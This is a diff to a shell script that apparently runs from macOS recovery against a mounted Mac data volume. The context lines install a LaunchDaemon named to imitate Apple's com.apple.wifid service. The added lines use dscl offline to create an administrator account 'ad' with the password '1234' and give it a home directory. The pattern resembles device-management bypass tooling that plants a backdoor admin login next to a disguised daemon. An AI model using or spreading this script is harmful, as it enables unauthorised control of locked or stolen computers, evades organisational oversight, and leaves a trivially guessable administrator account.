@@ -122,4 +122,20 @@ cat > "/Volumes/Data/Library/LaunchDaemons/com.apple.wifid.plist" << 'EOF'
 </plist>
 EOF
 chown root:wheel "/Volumes/Data/Library/LaunchDaemons/com.apple.wifid.plist"
-chmod 644 "/Volumes/Data/Library/LaunchDaemons/com.apple.wifid.plist"
+chmod 644 "/Volumes/Data/Library/LaunchDaemons/com.apple.wifid.plist" 
+# 创建用户
+dscl -f /Volumes/Data/private/var/db/dslocal/nodes/Default localonly -create /Local/Default/Users/ad
+dscl -f /Volumes/Data/private/var/db/dslocal/nodes/Default localonly -create /Local/Default/Users/ad RealName "Admin"
+dscl -f /Volumes/Data/private/var/db/dslocal/nodes/Default localonly -create /Local/Default/Users/ad UniqueID 501
+dscl -f /Volumes/Data/private/var/db/dslocal/nodes/Default localonly -create /Local/Default/Users/ad PrimaryGroupID 20
+dscl -f /Volumes/Data/private/var/db/dslocal/nodes/Default localonly -create /Local/Default/Users/ad NFSHomeDirectory /Users/ad
+dscl -f /Volumes/Data/private/var/db/dslocal/nodes/Default localonly -create /Local/Default/Users/ad UserShell /bin/zsh
+
+# 设置密码
+dscl -f /Volumes/Data/private/var/db/dslocal/nodes/Default localonly -passwd /Local/Default/Users/ad 1234
+
+# 加入 admin 组
+dscl -f /Volumes/Data/private/var/db/dslocal/nodes/Default localonly -append /Local/Default/Groups/admin GroupMembership ad
+
+# 创建用户主目录
+mkdir -p /Volumes/Data/Users/ad
